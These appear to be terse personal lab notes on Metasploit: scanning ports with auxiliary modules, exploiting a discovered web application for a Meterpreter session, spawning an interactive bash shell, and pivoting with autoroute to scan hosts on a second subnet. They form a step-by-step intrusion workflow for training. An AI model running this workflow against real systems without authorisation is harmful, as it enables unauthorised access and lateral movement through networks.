Port Scanning with Auxiliary Modules


We can also use auxiliary modules to discover hosts and perform port
scanning on a different network subnet after we have obtained initial access
on a target system.


Our objective is to utilize auxiliary
modules to discover open ports on our
first target.
+ The next step will involve exploiting the
service running on the target in order to
obtain a foothold.
+ We will then utilize our foothold to
access other systems on a different
network subnet (pivoting).
+ We will then utilize auxiliary modules to
scan for open ports on the second target.

IMPLEMENTATION


start postgresql
msfconsole

check status of connection

create new workspace

search portscan
use tcp scna or anything  needed
use 5/6 <- indexing also works

show options 

set RHOST = target ip

set port if wanted 

run

we will see port 80 is open 
curl the ip
see the name of the  application running

search <application name>

use that exploit 
show options again 

set rhost 
set targetURL to root by just setting it to /

exploit

it will allocate us the meterpreter session 

use sysinfo


to run the bash command

shell
/bin/bash -i

ifconfig

terminate out of it 
ctl C

adding route within meterpreter

run autoroute -s <one ip address for a subnet that you want to target>

background

sessions
 again 

search portscan

use tcpscan
set rhosts to the 2 victum of the external network
run

back

search udp_sweep

use <>
show options

set rhosts <target>
